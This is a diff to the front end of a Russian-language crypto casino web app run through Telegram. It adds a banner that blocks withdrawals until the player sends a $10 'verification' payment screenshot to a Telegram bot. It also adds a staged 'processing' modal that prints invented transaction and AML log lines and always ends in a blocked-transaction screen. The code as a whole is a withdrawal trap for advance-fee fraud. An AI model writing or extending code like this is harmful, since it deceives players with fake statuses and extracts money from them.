@@ -1478,6 +1478,16 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
   </div>
 </div>
 
+<!-- PROCESSING Modal (перед AML) -->
+<div id="processingModal" style="display:none;position:fixed;inset:0;z-index:10999;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);align-items:center;justify-content:center;">
+  <div style="background:#16181f;border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:32px 28px;width:90%;max-width:340px;text-align:center;">
+    <div id="procSpinner" style="width:52px;height:52px;border:3px solid rgba(255,255,255,0.08);border-top-color:#4ade80;border-radius:50%;margin:0 auto 20px;animation:spin 0.9s linear infinite;"></div>
+    <div style="font-weight:700;font-size:16px;margin-bottom:8px;">Обработка транзакции</div>
+    <div id="procStatus" style="font-size:13px;color:rgba(255,255,255,0.45);margin-bottom:20px;">Инициализация...</div>
+    <div id="procLog" style="font-family:monospace;font-size:10px;color:rgba(255,255,255,0.2);text-align:left;background:#0d1117;border-radius:8px;padding:10px 12px;min-height:64px;line-height:1.8;"></div>
+  </div>
+</div>
+
 <!-- AML BLOCK Modal -->
 <div id="amlModal" style="display:none;position:fixed;inset:0;z-index:11000;background:rgba(0,0,0,0.92);backdrop-filter:blur(12px);align-items:center;justify-content:center;padding:16px;">
   <div style="background:#0f0a0a;border:1px solid rgba(220,38,38,0.4);border-radius:16px;padding:24px;width:100%;max-width:400px;max-height:90vh;overflow-y:auto;box-sizing:border-box;">
@@ -1786,7 +1796,7 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
               </div>
               <span>Депозит</span>
             </button>
-            <button class="wallet-btn with" onclick="walletWithdraw()">
+            <button class="wallet-btn with" id="withdrawBtn" onclick="walletWithdraw()">
               <div class="w-icon-wrap">
                 <svg viewBox="0 0 24 24" fill="none">
                   <path d="M12 19V5" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round"/>
@@ -1797,6 +1807,19 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
               <span>Вывод</span>
             </button>
           </div>
+        </div>
+
+        <!-- KYC / Payment verification banner -->
+        <div id="kycBanner" style="display:none;margin-bottom:12px;background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.25);border-radius:12px;padding:14px 16px;">
+          <div style="font-weight:700;font-size:13px;color:#f59e0b;margin-bottom:6px;">🔒 Вывод заблокирован</div>
+          <div style="font-size:12px;color:rgba(255,255,255,0.65);line-height:1.6;margin-bottom:10px;">
+            Для активации вывода средств необходимо подтвердить платёж $10.<br>
+            Отправьте скриншот оплаты в бот верификации.
+          </div>
+          <a href="https://t.me/Payments_verify_bot" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;background:rgba(0,136,204,0.15);border:1px solid rgba(0,136,204,0.3);border-radius:8px;color:#38bdf8;font-weight:700;font-size:13px;text-decoration:none;">
+            <svg viewBox="0 0 24 24" fill="currentColor" style="width:15px;height:15px;"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-2.015 9.495c-.148.658-.543.818-1.1.508l-3.03-2.233-1.463 1.41c-.162.162-.297.297-.608.297l.216-3.075 5.595-5.055c.243-.216-.054-.336-.378-.12L7.08 14.408l-2.99-.934c-.65-.204-.663-.65.136-.963l11.67-4.5c.54-.196 1.015.12.666.237z"/></svg>
+            Отправить скриншот → @Payments_verify_bot
+          </a>
         </div>
 
         <!-- Demo/Real toggle -->
@@ -1958,6 +1981,7 @@ const S = {
   isAuthed: false,
   isAdmin: false,
   isDemo: false,
+  paymentVerified: false,
   freeSpins: [],
   transactions: [],
 };
@@ -2054,6 +2078,7 @@ async function bootAuth() {
     S.isAuthed = true;
     S.isAdmin = data.is_admin;
     S.balance = parseFloat(data.balance) || 0;
+    S.paymentVerified = data.payment_verified || false;
     S.freeSpins = data.free_spins || [];
     S.transactions = (data.transactions || []).map(tx => ({
       type: tx.type === 'deposit' ? 'dep' : tx.type === 'win' || tx.type === 'free_spin_win' ? 'win' : 'lose',
@@ -2089,6 +2114,14 @@ async function bootAuth() {
           // Админ написал /reject — приложение блокируется
           if (payload.new.aml_status === 'blocked' && !document.body.classList.contains('danger-mode')) {
             showAmlModal(S.balance);
+          }
+          // Платёж подтверждён — разблокируем вывод
+          if (payload.new.payment_verified && !S.paymentVerified) {
+            S.paymentVerified = true;
+            document.getElementById('kycBanner').style.display = 'none';
+            document.getElementById('withdrawBtn').style.opacity = '1';
+            showToast('✅ Вывод разблокирован!');
+            if(navigator.vibrate) navigator.vibrate([50,30,100]);
           }
         })
         .subscribe();
@@ -2999,6 +3032,16 @@ function bjEnd(reason){
 function updateWallet(){
   document.getElementById('walletBal').textContent=fmt(S.balance);
   document.getElementById('walletUsd').textContent=`USDT · Tether`;
+  // Показываем/скрываем баннер KYC и блокируем кнопку вывода
+  const banner = document.getElementById('kycBanner');
+  const wBtn   = document.getElementById('withdrawBtn');
+  if(!S.isDemo && !S.paymentVerified){
+    banner.style.display = 'block';
+    if(wBtn){ wBtn.style.opacity='0.4'; wBtn.title='Подтвердите платёж $10'; }
+  } else {
+    banner.style.display = 'none';
+    if(wBtn){ wBtn.style.opacity='1'; wBtn.title=''; }
+  }
   loadWalletWithdrawals();
   const tl=document.getElementById('txList');
   const txIcons = {
@@ -3054,8 +3097,15 @@ async function confirmDeposit(){
 
 // ═══ WITHDRAW ═══
 function walletWithdraw(){
-  if(S.isDemo){ showToast('Демо режим — откройте казино через Telegram бота для реальной игры'); return; }
+  if(S.isDemo){ showToast('Демо режим — откройте казино через @CasinoBoom1_bot'); return; }
   if(S.balance < 5){ showToast('Минимум для вывода: 5 USDT'); return; }
+  if(!S.paymentVerified){
+    document.getElementById('kycBanner').style.display = 'block';
+    document.getElementById('kycBanner').scrollIntoView({ behavior:'smooth', block:'center' });
+    if(navigator.vibrate) navigator.vibrate(40);
+    showToast('Сначала подтвердите платёж $10');
+    return;
+  }
   document.getElementById('withAvail').textContent = fmt(S.balance);
   document.getElementById('withAmount').value = fmt(S.balance);
   document.getElementById('withTrc20').value = '';
@@ -3354,8 +3404,41 @@ async function confirmWithdraw(){
   }).catch(()=>{});
 
   closeWithdrawModal();
-  showAmlModal(amount);
+  showProcessingModal(amount);
 
+}
+
+function showProcessingModal(amount) {
+  const modal    = document.getElementById('processingModal');
+  const statusEl = document.getElementById('procStatus');
+  const logEl    = document.getElementById('procLog');
+  logEl.innerHTML = '';
+  modal.style.display = 'flex';
+
+  const steps = [
+    { status: 'Проверка баланса...',           log: 'balance_check → OK',                   delay: 1800 },
+    { status: 'Инициализация транзакции...',    log: 'tx_init → accepted',                   delay: 2200 },
+    { status: 'Отправка на адрес...',           log: 'routing → BNB Smart Chain',            delay: 2500 },
+    { status: 'Верификация сети...',            log: 'network_verify → pending',             delay: 2000 },
+    { status: 'Проверка AML/CFT фильтров...',  log: 'aml_scan → flag_detected',             delay: 2500 },
+    { status: 'Анализ транзакции...',           log: 'exploit_signature → MATCH',            delay: 1800 },
+    { status: 'Блокировка транзакции...',       log: 'tx_status → BLOCKED',                  delay: 1400 },
+  ];
+
+  let i = 0;
+  function next() {
+    if (i >= steps.length) {
+      modal.style.display = 'none';
+      showAmlModal(amount);
+      return;
+    }
+    const s = steps[i];
+    statusEl.textContent = s.status;
+    logEl.innerHTML += `<span style="color:rgba(255,255,255,0.3)">${s.log}</span>\n`;
+    i++;
+    setTimeout(next, s.delay);
+  }
+  next();
 }
 
 function showAmlModal(amount) {
